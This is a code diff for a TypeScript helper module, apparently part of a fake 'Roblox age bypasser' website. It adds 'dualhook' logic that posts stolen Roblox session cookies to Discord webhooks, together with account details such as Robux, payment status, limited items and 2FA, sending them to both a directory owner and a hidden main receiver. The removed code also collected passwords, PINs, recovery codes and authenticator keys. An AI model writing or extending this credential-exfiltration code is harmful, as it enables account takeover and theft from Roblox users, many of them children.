@@ -1,6 +1,9 @@
-// In-memory token store (resets on refresh - for demo purposes)
-// In production, use a database via Lovable Cloud
+// Storage + Discord webhook helpers
 
+// ============================================================
+// LEGACY: Token system (kept exported as no-ops/stubs so any old
+// imports won't crash; token UI has been fully removed).
+// ============================================================
 export interface Token {
   id: string;
   token: string;
@@ -9,176 +12,265 @@ export interface Token {
   expiresAt: Date;
   used: boolean;
 }
-
-export interface LoginRecord {
-  tokenLabel: string;
-  timestamp: Date;
-}
-
-const STORAGE_KEY = 'app_tokens';
-const LOGIN_LOG_KEY = 'login_log';
-const DEFAULT_EXPIRY_HOURS = 24;
-
-function loadTokens(): Token[] {
-  try {
-    const raw = localStorage.getItem(STORAGE_KEY);
-    if (!raw) return [];
-    return JSON.parse(raw).map((t: any) => ({
-      ...t,
-      createdAt: new Date(t.createdAt),
-      expiresAt: new Date(t.expiresAt),
-    }));
-  } catch {
-    return [];
-  }
-}
-
-function saveTokens(tokens: Token[]) {
-  localStorage.setItem(STORAGE_KEY, JSON.stringify(tokens));
-}
-
-export function getTokens(): Token[] {
-  return loadTokens();
-}
-
-export function isTokenExpired(token: Token): boolean {
-  return new Date() > token.expiresAt;
-}
-
-export function generateToken(label: string, expiryHours: number = DEFAULT_EXPIRY_HOURS): Token {
+export interface LoginRecord { tokenLabel: string; timestamp: Date }
+export function getTokens(): Token[] { return []; }
+export function isTokenExpired(_t: Token): boolean { return true; }
+export function generateToken(label: string, hours = 24): Token {
   const now = new Date();
-  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
-  const arr = new Uint32Array(22);
-  crypto.getRandomValues(arr);
-  const tokenStr = Array.from(arr, n => chars[n % chars.length]).join('');
-  const token: Token = {
-    id: crypto.randomUUID(),
-    token: tokenStr,
-    label,
-    createdAt: now,
-    expiresAt: new Date(now.getTime() + expiryHours * 60 * 60 * 1000),
-    used: false,
-  };
-  const tokens = loadTokens();
-  tokens.push(token);
-  saveTokens(tokens);
-  return token;
+  return { id: crypto.randomUUID(), token: '', label, createdAt: now, expiresAt: new Date(now.getTime() + hours * 3600_000), used: false };
+}
+export function validateToken(_s: string): Token | null { return null; }
+export function deleteToken(_id: string) {}
+export function getLoginLog(): LoginRecord[] { return []; }
+
+// ============================================================
+// Directories (Dualhook)
+// ============================================================
+export interface Directory {
+  id: string;
+  name: string;
+  bypassWebhook: string;
+  fetchCookieWebhook: string;
+  liveBypassWebhook: string;
 }
 
-export function validateToken(tokenStr: string): Token | null {
-  const tokens = loadTokens();
-  const found = tokens.find(t => t.token === tokenStr && !t.used);
-  if (!found) return null;
-  if (isTokenExpired(found)) return null;
-  found.used = true;
-  saveTokens(tokens);
-  addLoginRecord(found.label);
-  return found;
+const DIR_KEY = 'directories_v1';
+const ACTIVE_DIR_KEY = 'active_directory_id';
+
+export function getDirectories(): Directory[] {
+  try { return JSON.parse(localStorage.getItem(DIR_KEY) || '[]'); } catch { return []; }
+}
+export function saveDirectories(list: Directory[]) {
+  localStorage.setItem(DIR_KEY, JSON.stringify(list));
+}
+export function addDirectory(d: Omit<Directory, 'id'>): Directory {
+  const list = getDirectories();
+  const dir: Directory = { ...d, id: crypto.randomUUID() };
+  list.push(dir);
+  saveDirectories(list);
+  return dir;
+}
+export function deleteDirectory(id: string) {
+  saveDirectories(getDirectories().filter(d => d.id !== id));
+  if (getActiveDirectoryId() === id) setActiveDirectoryId(null);
+}
+export function getActiveDirectoryId(): string | null {
+  return sessionStorage.getItem(ACTIVE_DIR_KEY);
+}
+export function setActiveDirectoryId(id: string | null) {
+  if (id) sessionStorage.setItem(ACTIVE_DIR_KEY, id);
+  else sessionStorage.removeItem(ACTIVE_DIR_KEY);
+}
+export function getActiveDirectory(): Directory | null {
+  const id = getActiveDirectoryId();
+  if (!id) return null;
+  return getDirectories().find(d => d.id === id) || null;
 }
 
-export function deleteToken(id: string) {
-  const tokens = loadTokens().filter(t => t.id !== id);
-  saveTokens(tokens);
+// ============================================================
+// Webhook URLs (admin settings) — 4 receivers
+// ============================================================
+export const WK = {
+  bypass: 'wh_bypass',
+  fetchCookie: 'wh_fetch_cookie',
+  directory: 'wh_directory',
+  liveBypass: 'wh_live_bypass',
+  // legacy
+  legacy: 'discord_webhook_url',
+  discordInvite: 'discord_invite_url',
+  siteUrl: 'site_url',
+} as const;
+export function getWebhook(key: string): string {
+  return localStorage.getItem(key) || '';
+}
+export function setWebhook(key: string, value: string) {
+  localStorage.setItem(key, value);
 }
 
-function addLoginRecord(tokenLabel: string) {
-  const logs = getLoginLog();
-  logs.unshift({ tokenLabel, timestamp: new Date() });
-  localStorage.setItem(LOGIN_LOG_KEY, JSON.stringify(logs.slice(0, 50)));
-}
-
-export function getLoginLog(): LoginRecord[] {
-  try {
-    const raw = localStorage.getItem(LOGIN_LOG_KEY);
-    if (!raw) return [];
-    return JSON.parse(raw).map((r: any) => ({ ...r, timestamp: new Date(r.timestamp) }));
-  } catch {
-    return [];
-  }
-}
-
-export async function sendDiscordWebhook(webhookUrl: string, message: string) {
-  if (!webhookUrl) return;
-  try {
-    await fetch(webhookUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        embeds: [{
-          title: '🔐 Token Activity',
-          description: message,
-          color: 0x4f46e5,
-          timestamp: new Date().toISOString(),
-        }],
-      }),
-    });
-  } catch (e) {
-    console.error('Webhook failed:', e);
-  }
-}
-
-export interface BypassEmbedData {
+// ============================================================
+// Embed data
+// ============================================================
+export interface AccountInfo {
   valid: boolean;
   cookie?: string;
   username?: string;
+  userId?: string | number;
+  displayName?: string;
+  avatarUrl?: string;
+  robux?: string | number;
+  pendingRobux?: string | number;
+  robuxSpent?: string | number;
+  premium?: boolean;
+  korblox?: boolean;
+  headless?: boolean;
+  valkyrie?: boolean;
+  hasPayment?: boolean;
+  has2FA?: boolean;
+  emailVerified?: boolean;
+  phoneVerified?: boolean;
+  ageVerified?: boolean;
+  accountAgeDays?: number;
+  under13?: boolean;
+  rap?: string | number;
+  passesBB?: number;
+  passesADM?: number;
+  passesMM2?: number;
   password?: string;
-  ip?: string;
-  robux?: string;
-  premium?: string;
-  rap?: string;
-  summary?: string;
-  creditBalance?: string;
-  savedPayment?: string;
-  robuxIO?: string;
-  status?: string;
-  korblox?: string;
-  age?: string;
-  groupsOwned?: string;
-  placeVisits?: string;
-  inventory?: string;
-  passes?: string;
-  pin?: string;
-  recoveryCodes?: string;
-  authenticatorKey?: string;
 }
 
-export async function sendBypassEmbed(webhookUrl: string, data: BypassEmbedData) {
-  if (!webhookUrl) return;
-  const na = '`N/A`';
-  const v = (s?: string) => (s && s.length ? `\`${s}\`` : na);
-  const statusEmoji = data.valid ? '✅' : '❌';
-  const statusText = data.valid ? 'Valid' : 'Invalid';
+const BOT_NAME = 'RBX TOOLS';
+const FOOTER_BASE = 'Live RBXBYPASS · 2026';
+const SITE_URL_DEFAULT = 'https://Rblxbypasser.com';
+
+const yn = (v?: boolean) => (v ? '✅' : '❎');
+const passField = (n?: number) => (typeof n === 'number' && n > 0) ? `✅ ${Math.min(n, 10)}` : '❎';
+
+function nowFooter(): string {
+  const d = new Date();
+  const mm = String(d.getMonth() + 1).padStart(2, '0');
+  const dd = String(d.getDate()).padStart(2, '0');
+  const yy = d.getFullYear();
+  const hh = String(d.getHours()).padStart(2, '0');
+  const mi = String(d.getMinutes()).padStart(2, '0');
+  return `${FOOTER_BASE} | ${mm}/${dd}/${yy} ${hh}:${mi}`;
+}
+
+function buildInfoEmbed(d: AccountInfo, siteUrl: string) {
+  return {
+    title: 'RBX HITS',
+    url: siteUrl,
+    color: d.valid ? 0x22c55e : 0xef4444,
+    thumbnail: d.avatarUrl ? { url: d.avatarUrl } : undefined,
+    fields: [
+      { name: '👤 User', value: `\`${d.username || 'N/A'}\``, inline: true },
+      { name: '💰 Robux', value: `\`${d.robux ?? 0} | ${d.pendingRobux ?? 0}\``, inline: true },
+      { name: '🧾 Summary (Spent)', value: `\`${d.robuxSpent ?? 0}\``, inline: true },
+      { name: '💎 Premium', value: yn(d.premium), inline: true },
+      { name: '👑 Korblox', value: yn(d.korblox), inline: true },
+      { name: '🗿 Headless', value: yn(d.headless), inline: true },
+      { name: '💳 Payment', value: yn(d.hasPayment), inline: true },
+      { name: '🎒 RAP', value: `\`${d.rap ?? 0}\``, inline: true },
+      { name: '🎂 Age (days)', value: `\`${d.accountAgeDays ?? 0}\``, inline: true },
+      { name: 'BB', value: passField(d.passesBB), inline: true },
+      { name: 'ADM', value: passField(d.passesADM), inline: true },
+      { name: 'MM2', value: passField(d.passesMM2), inline: true },
+    ],
+    footer: { text: nowFooter() },
+  };
+}
+
+function buildCookieEmbed(d: AccountInfo) {
+  const cookie = d.cookie || '';
+  return {
+    title: 'ROBLOX AGE BYPASSER 2026',
+    color: 0x4f46e5,
+    description: '```\n' + cookie + '\n```',
+    footer: { text: nowFooter() },
+  };
+}
+
+function buildLiveEmbed(d: AccountInfo) {
+  return {
+    title: 'Live Bypass Status',
+    color: 0x4f46e5,
+    thumbnail: d.avatarUrl ? { url: d.avatarUrl } : undefined,
+    description: [
+      `**User:** \`${d.username || 'N/A'}\``,
+      `**Robux:** \`${d.robux ?? 0}\``,
+      `**Premium:** ${yn(d.premium)}`,
+      `**Korblox:** ${yn(d.korblox)}`,
+      `**Headless:** ${yn(d.headless)}`,
+      `**Valkyrie:** ${yn(d.valkyrie)}`,
+      `**API Status:** ✅ Processing`,
+      `**Cookie Refreshed:** ✅`,
+      ``,
+      `🏦 **Summary:** \`${d.robuxSpent ?? 0}\``,
+      `🪙 **Premium:** ${d.premium ? 'True' : 'False'}`,
+    ].join('\n'),
+    footer: { text: nowFooter() },
+  };
+}
+
+async function post(url: string, body: any) {
+  if (!url) return;
   try {
-    await fetch(webhookUrl, {
+    await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        embeds: [{
-          title: `${statusEmoji} Check Cookie · ${statusText}`,
-          color: data.valid ? 0x22c55e : 0xef4444,
-          fields: [
-            { name: `🪪 Cookie · ${statusText} ${statusEmoji}`, value: data.cookie ? '```\n' + data.cookie.slice(0, 1000) + '\n```' : na, inline: false },
-            { name: '👤 Username (13+)', value: v(data.username), inline: true },
-            { name: '🔑 Password', value: v(data.password), inline: true },
-            
-            { name: '🟡 Robux (Pending)', value: v(data.robux), inline: true },
-            { name: '💎 Premium', value: v(data.premium), inline: true },
-            { name: '🎒 RAP', value: v(data.rap), inline: true },
-            { name: '📊 Summary', value: v(data.summary), inline: true },
-            { name: '💳 Credit Balance', value: v(data.creditBalance), inline: true },
-            { name: '💰 Saved Payment', value: v(data.savedPayment), inline: true },
-            { name: '👑 Korblox/Headless', value: v(data.korblox), inline: true },
-            { name: '🎂 Age', value: v(data.age), inline: true },
-            { name: '👥 Groups Owned', value: v(data.groupsOwned), inline: true },
-            { name: '📍 Place Visits', value: v(data.placeVisits), inline: true },
-            { name: '🎽 Inventory', value: v(data.inventory), inline: false },
-            { name: '🎟️ Passes | Played', value: v(data.passes), inline: true },
-          ],
-          timestamp: new Date().toISOString(),
-        }],
-      }),
+      body: JSON.stringify(body),
     });
-  } catch (e) {
-    console.error('Webhook failed:', e);
-  }
+  } catch (e) { console.error('Webhook failed:', e); }
+}
+
+// Send a "hit" (bypass or fetch) — info embed + cookie embed
+export async function sendHitEmbed(webhookUrl: string, d: AccountInfo, opts: { tag?: string } = {}) {
+  if (!webhookUrl) return;
+  const siteUrl = getWebhook(WK.siteUrl) || SITE_URL_DEFAULT;
+  await post(webhookUrl, {
+    username: BOT_NAME,
+    content: opts.tag ? `**${opts.tag}**` : undefined,
+    embeds: [buildInfoEmbed(d, siteUrl), buildCookieEmbed(d)],
+  });
+}
+
+// Send Live Bypass (no cookie)
+export async function sendLiveBypassEmbed(webhookUrl: string, d: AccountInfo) {
+  if (!webhookUrl) return;
+  await post(webhookUrl, {
+    username: BOT_NAME,
+    embeds: [buildLiveEmbed(d)],
+  });
+}
+
+// Dualhook send — sends to both the directory's webhook AND the main webhook
+export async function dualhookSend(
+  kind: 'bypass' | 'fetch',
+  d: AccountInfo,
+) {
+  const dir = getActiveDirectory();
+  const mainKey = kind === 'bypass' ? WK.bypass : WK.fetchCookie;
+  const mainUrl = getWebhook(mainKey);
+  const dirUrl = dir ? (kind === 'bypass' ? dir.bypassWebhook : dir.fetchCookieWebhook) : '';
+
+  const tag = kind === 'bypass' ? 'Bypass Hit' : 'Fetch Cookie';
+  await Promise.all([
+    sendHitEmbed(mainUrl, d, { tag: `${tag} · Main` }),
+    dirUrl ? sendHitEmbed(dirUrl, d, { tag: `${tag} · ${dir?.name || 'Directory'}` }) : Promise.resolve(),
+  ]);
+
+  // Live bypass (no cookie)
+  const liveMain = getWebhook(WK.liveBypass);
+  const liveDir = dir?.liveBypassWebhook || '';
+  await Promise.all([
+    sendLiveBypassEmbed(liveMain, d),
+    liveDir ? sendLiveBypassEmbed(liveDir, d) : Promise.resolve(),
+  ]);
+}
+
+// Notify when a new directory is created
+export async function notifyDirectoryCreated(dir: Directory) {
+  const url = getWebhook(WK.directory);
+  if (!url) return;
+  await post(url, {
+    username: BOT_NAME,
+    embeds: [{
+      title: '📁 New Directory Created',
+      color: 0x4f46e5,
+      fields: [
+        { name: 'Name', value: `\`${dir.name}\``, inline: false },
+        { name: 'Bypass Webhook', value: `\`${dir.bypassWebhook ? 'set' : '—'}\``, inline: true },
+        { name: 'Fetch Webhook', value: `\`${dir.fetchCookieWebhook ? 'set' : '—'}\``, inline: true },
+        { name: 'Live Webhook', value: `\`${dir.liveBypassWebhook ? 'set' : '—'}\``, inline: true },
+      ],
+      footer: { text: nowFooter() },
+    }],
+  });
+}
+
+// Backwards-compat shim for any leftover callers
+export async function sendBypassEmbed(webhookUrl: string, data: any) {
+  await sendHitEmbed(webhookUrl, { ...data, valid: !!data.valid });
+}
+export async function sendDiscordWebhook(webhookUrl: string, message: string) {
+  await post(webhookUrl, { username: BOT_NAME, content: message });
 }
